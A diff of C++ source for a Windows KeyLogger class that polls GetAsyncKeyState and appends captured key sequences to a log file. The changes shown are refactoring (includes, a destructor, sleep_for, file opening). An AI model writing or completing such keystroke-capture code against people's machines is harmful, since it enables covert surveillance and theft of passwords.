@@ -2,13 +2,16 @@
 
 #include <fstream>
 #include <string>
-#include <Windows.h>
-#include <fstream>
 #include <iostream>
+#include <vector>
+#include <thread>
+#include <Windows.h>
 
 class KeyLogger
 {
 public:
+
+    ~KeyLogger() { this->stop(); }
 
     using vk_key_state_t = decltype(GetAsyncKeyState(0));
     using vk_key_t = int;
@@ -72,7 +75,7 @@ public:
                     export_sequence(key_seq, file);
                     file << std::endl;
                 }
-                Sleep(freq);
+                std::this_thread::sleep_for(duration_ms(freq));
                 count++;
             };
 
@@ -92,7 +95,7 @@ public:
         //Sleep(m_sleep);
 
         std::fstream file;
-        file.open(filename, std::fstream::out | std::fstream::app);
+        file.open(filename.data(), std::fstream::out | std::fstream::app);
 
         auto key_log = [&](auto&& msg) {
             std::cout << msg << std::endl;
